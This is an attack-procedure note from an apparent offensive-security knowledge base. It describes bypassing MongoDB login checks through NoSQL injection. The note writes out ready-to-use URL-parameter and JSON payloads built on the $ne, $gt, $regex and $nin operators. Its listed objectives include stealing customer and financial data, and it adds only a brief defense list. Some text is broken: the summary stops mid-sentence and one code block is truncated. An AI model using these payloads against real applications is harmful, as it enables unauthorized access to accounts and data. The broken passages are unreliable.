---
id: dead20bf-0186-4fff-9539-c8100809beab
name: NoSQL Injection Authentication Bypass using Not Equal or Greater
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:31.421773+00:00'
updated_at: '2023-04-10T20:23:01.237013+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
tags:
- '[[Authentication Bypass]]'
- '[[Exploit]]'
- '[[NoSQL Injection]]'
commands:
- '[[Converting Data to JSON using MongoDB Query Operators]]'
- '[[Filtering Data using MongoDB Query Operators]]'
---

# NoSQL Injection Authentication Bypass using Not Equal or Greater

## Summary

NoSQL Injection is a type of injection attack that targets NoSQL databases. By exploiting a vulnerability in the authentication mechanism, an attacker can bypass authentication and gain unauthorized access to sensitive data. This specific procedure uses the 'Not Equal or Greater' operator to bypass

## Description

# Description

NoSQL Injection is a type of injection attack that targets NoSQL databases. By exploiting a vulnerability in the authentication mechanism, an attacker can bypass authentication and gain unauthorized access to sensitive data. This specific procedure uses the 'Not Equal or Greater' operator to bypass authentication. By injecting a specially crafted payload into the authentication field, the attacker can cause the database to return all records that are not equal or greater than the user's input. This can allow the attacker to bypass the authentication mechanism and gain access to sensitive data.

From a technical standpoint, this attack exploits a vulnerability in the application's input validation mechanism. The attacker can inject a specially crafted payload that is interpreted by the database as a legitimate query. This can cause the database to return data that the attacker is not authorized to access.

The business value of this attack is significant, as it can allow an attacker to gain access to sensitive data, such as customer records, financial data, and intellectual property. This can result in reputational damage, financial loss, and legal liability for the victim organization.

 

## Requirements

1. Access to the target application

1. Knowledge of the authentication mechanism

1. Ability to craft a specially crafted payload

 

## Defense

1. Implement input validation and sanitization mechanisms to prevent injection attacks

1. Use parameterized queries to prevent injection attacks

1. Implement multi-factor authentication to reduce the risk of authentication bypass

 

## Objectives

1. Bypass authentication and gain unauthorized access to sensitive data

1. Steal sensitive data such as customer records, financial data, and intellectual property

 

# Instructions

1. This command provides a way to bypass basic authentication using not equal or greater than operators. The following arguments can be used:

- $ne: not equal to
- $regex: regular expression
- $gt: greater than
- $lt: less than
- $nin: not in

To use this command, enter the values of the arguments in the following format:

username[$ne]=value&password[$ne]=value
login[$regex]=value&pass[$ne]=value
login[$gt]=value&login[$lt]=value&pass[$ne]=value
login[$nin][]=value&login[$nin][]=value&pass[$ne]=value

 



**Code**: [[in DATA
username[$ne]=toto&password[$ne]=toto
logi]]



> This command can be used to bypass basic authentication by specifying values that are not equal to the expected ones or by specifying a value greater than the expected one. The $ne operator is used to specify values that are not equal to the expected ones, while the $gt operator is used to specify values that are greater than the expected ones. The $regex operator can be used to specify a regular expression that matches the expected value. The $lt operator can be used to specify values that are less than the expected ones. The $nin operator can be used to specify values that are not in a list of expected values.



**Command** ([[Filtering Data using MongoDB Query Operators]]):

```bash
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```





**Command** ([[Converting Data to JSON using MongoDB Query Operators]]):

```bash
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```



## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]

## Commands Used

- [[Converting Data to JSON using MongoDB Query Operators]]
- [[Filtering Data using MongoDB Query Operators]]

## Tags

- [[Authentication Bypass]]
- [[Exploit]]
- [[NoSQL Injection]]


